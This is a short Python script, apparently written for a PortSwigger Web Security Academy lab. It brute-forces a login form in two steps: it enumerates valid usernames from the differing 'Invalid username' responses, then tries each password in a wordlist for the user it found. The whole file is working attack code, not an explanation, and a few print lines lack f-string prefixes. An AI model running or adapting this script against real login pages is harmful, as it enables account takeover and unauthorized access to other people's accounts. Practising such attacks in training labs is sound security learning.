import requests
import json
from bs4 import BeautifulSoup

url="https://0ac200af04c8c04281427593007e0044.web-security-academy.net/login"
username_file="usuarios_noborrar.txt"
password_file="passwords_db.txt"

#function to upload users/passwords
def load_file(file):
    try:
        with open(file,"r") as final_file:
            lines=[]
            for line in final_file.readlines():
                lines.append(line.strip())
            return lines
    except FileNotFoundError:
        print(f"the file {file} could not be found")
        return []

#function to brute force post requests
def bruteforce_login(url,usernames,passwords):
    #headers = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36","Content-Type": "application/x-www-form-urlencoded"}
    final_username=""
    final_password=""
    for username in usernames:
            data={"username":username,"password":"asdw"}
            try:
                response=requests.post(url,data=data)
                #print(f"Respuesta completa para {username}:\n{response.text}")
                if "Invalid username" in response.text:
                    print(f"[-] Invalid username: {username}")
                else:
                    print("valid user found {username}")
                    final_username=username
                    break
            except requests.exceptions.RequestException as e:
                print(f"[!] Error en la solicitud: {e}")
    for password in passwords:
            data={"username":final_username,"password":password}
            try:
                response=requests.post(url,data=data)
                #print(f"Respuesta completa para {username}:\n{response.text}")
                if "Incorrect password" in response.text:
                    print(f"[-] Invalid password: {password}")
                else:
                    print("valid password found {password}")
                    final_password=password
                    break
            except requests.exceptions.RequestException as e:
                print(f"[!] Error en la solicitud: {e}")
    print("username found ",username," password  found", password)
    
usernames=load_file(username_file)
passwords=load_file(password_file)

bruteforce_login(url,usernames,passwords)
